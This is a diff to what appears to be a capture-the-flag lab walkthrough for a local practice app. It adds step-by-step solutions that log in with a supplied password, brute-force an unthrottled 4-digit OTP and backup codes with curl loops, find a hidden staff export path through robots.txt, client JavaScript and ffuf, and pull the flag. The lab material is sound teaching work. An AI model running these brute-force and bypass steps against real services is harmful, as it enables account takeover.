@@ -70,13 +70,44 @@ guess except say "wrong." No delay, no lock-out after N failures, no invalidatio
 challenge. So the entire space is searchable online, and the average attacker lands the real
 code in ~5,000 requests and a few seconds.
 
+### How to solve it, step by step
+
+**1. Clear the first factor and keep the cookie.** The password is given; log in and save the
+session so every later request is "half-authenticated":
+
 ```bash
-# logged in (first factor done), cookie in cookies.txt:
-for i in $(seq -w 0 9999); do
-  curl -s -X POST http://localhost:8000/masquerade/op7/api/verify-otp \
-       -b cookies.txt -d "otp=$i" | grep -q '"ok": true' && { echo "CODE $i"; break; }
+curl -s -c cookies.txt -X POST http://localhost:8000/masquerade/op7/login \
+     -d "username=night.duty&password=KafeNight2024!" -o /dev/null
+```
+
+**2. Probe before you brute.** Submit two or three deliberately wrong codes and watch the
+response. It's the same `401 {"error":"incorrect_code"}` every time — no growing delay, no
+"account locked", no new challenge. *That* observation is the finding; the brute force is just
+acting on it.
+
+```bash
+for c in 1111 2222 3333; do
+  curl -s -X POST http://localhost:8000/masquerade/op7/api/verify-otp -b cookies.txt -d "otp=$c"
+  echo
 done
 ```
+
+**3. Find where the code prompt actually posts.** You don't have to guess the endpoint — enter
+any code in the browser with DevTools ▸ Network open (or Burp), and you'll see the form hit
+`POST /masquerade/op7/api/verify-otp`.
+
+**4. Brute the whole 4-digit space** until one comes back `"ok":true` (or point Burp Intruder at
+the same request):
+
+```bash
+for i in $(seq -w 0 9999); do
+  curl -s -X POST http://localhost:8000/masquerade/op7/api/verify-otp \
+       -b cookies.txt -d "otp=$i" | grep -q '"ok":true' && { echo "CODE $i"; break; }
+done
+```
+
+The success response carries `"next": "/masquerade/op7/vault"` — follow it (with the same cookie)
+and you're in.
 
 ### Why length is a red herring
 
@@ -98,19 +129,56 @@ them.
 ### First you have to *find* it — that's half the finding
 
 This is forced browsing, and forced browsing only means anything when the door is actually
-hidden. The app never links `/masquerade/op7/staff/export` anywhere in its UI — you discover it
-by recon, the same way you would on a real engagement:
+hidden. The app never links `/masquerade/op7/staff/export` anywhere in its UI. Here are the three
+ways to discover it — any one is enough.
 
-- **`/robots.txt`** disallows `/masquerade/op7/staff/` — the classic case of a site's own
-  "please don't crawl this" file handing an attacker the exact paths worth looking at.
-- **The portal's client JS** (`/static/js/op7-portal.js`, loaded on the two-step page) names the
-  endpoint outright in its config, with a leftover dev comment admitting it "isn't behind the
-  second-factor check yet."
-- **Content discovery** (`ffuf`/`gobuster` with a common wordlist) would turn up `staff` and
-  `export` on their own.
+**Way A — read `/robots.txt` (fastest).** The very first thing to check on any target. The site's
+own file lists the paths it doesn't want crawled, which is exactly where to look:
 
-If the app had simply shown you a button, none of that skill would be exercised — which is why it
+```bash
+$ curl -s http://localhost:8000/robots.txt
+User-agent: *
+Disallow: /masquerade/op7/staff/     ←  something lives under /staff/
+Disallow: /masquerade/op7/api/
+```
+
+That points you at `/masquerade/op7/staff/`. The resource under it is `staff/export`.
+
+**Way B — read the JavaScript the page loads.** The two-step page pulls in
+`/static/js/op7-portal.js`. Open DevTools ▸ Sources (or just `curl` it) and read it — client code
+routinely names endpoints the UI never links:
+
+```bash
+$ curl -s http://localhost:8000/static/js/op7-portal.js | grep -i staff
+    staffExport: "/masquerade/op7/staff/export"   // internal — pre-2FA, staff console only
+```
+
+The leftover dev comment even admits it predates the 2FA rollout and "isn't behind the
+second-factor check yet" — a gift, but only to someone who bothered to read the JS.
+
+**Way C — content discovery.** With no robots.txt or JS to read, you'd brute the path with a
+wordlist. Both segments are common dictionary words:
+
+```bash
+ffuf -u http://localhost:8000/masquerade/op7/FUZZ -w /usr/share/wordlists/dirb/common.txt -b "session=…"
+# … then fuzz one level deeper under /staff/ for 'export'
+```
+
+If the app had simply shown you a button, none of this skill would be exercised — which is why it
 doesn't.
+
+### How to exploit it once found
+
+Log in (first factor only — **do not** enter any code), then request the endpoint with that
+half-authenticated cookie:
+
+```bash
+curl -s -c cookies.txt -X POST http://localhost:8000/masquerade/op7/login \
+     -d "username=night.duty&password=KafeNight2024!" -o /dev/null
+curl -s -b cookies.txt http://localhost:8000/masquerade/op7/staff/export | grep -o 'R6S{[^}]*}'
+```
+
+The roster (and the flag) come back with no second factor ever presented.
 
 ### The bug — and why it's the most important one here
 
@@ -148,14 +216,34 @@ treat "passed step 1" as "authenticated."
 ### The bug
 
 "Lost your phone? Use a backup code." Backup codes here are `KAFE-0000`…`KAFE-9999` — a tiny,
-**unthrottled** space, and any valid one skips the OTP entirely:
+**unthrottled** space, and any valid one skips the OTP entirely.
+
+### How to solve it, step by step
+
+**1. Find the recovery path.** Unlike Stage 2, this one is *meant* to be visible — it's a real
+feature. On the two-step prompt there's a **"Lost your device?"** link; it goes to
+`/masquerade/op7/backup`. (Finding the entry point is trivial; the vulnerability is what's behind
+it.)
+
+**2. Read what it asks for.** The recovery page shows the format up front —
+`KAFE-0000` — so you already know the shape of the space: a fixed prefix plus 4 digits, i.e.
+10,000 candidates. Real apps show the format too; that alone isn't the bug.
+
+**3. Confirm it's not throttled.** Submit a couple of wrong backup codes — same plain "isn't
+valid" each time, no lock-out. Same weakness as Stage 1, different door.
+
+**4. Find where it posts and brute it.** The form posts to `/masquerade/op7/backup`; there's also
+a JSON endpoint `/masquerade/op7/api/backup` that's cleaner to loop. Several of the 10,000 codes
+are valid (real accounts get a batch), so you land one quickly:
 
 ```bash
 for i in $(seq -w 0 9999); do
   curl -s -X POST http://localhost:8000/masquerade/op7/api/backup \
-       -b cookies.txt -d "backup=KAFE-$i" | grep -q '"ok": true' && { echo "KAFE-$i"; break; }
+       -b cookies.txt -d "backup=KAFE-$i" | grep -q '"ok":true' && { echo "KAFE-$i"; break; }
 done
 ```
+
+Any valid code promotes your session to fully verified — the OTP is never involved.
 
 ### Why this is a *separate* lesson from Stage 1
 
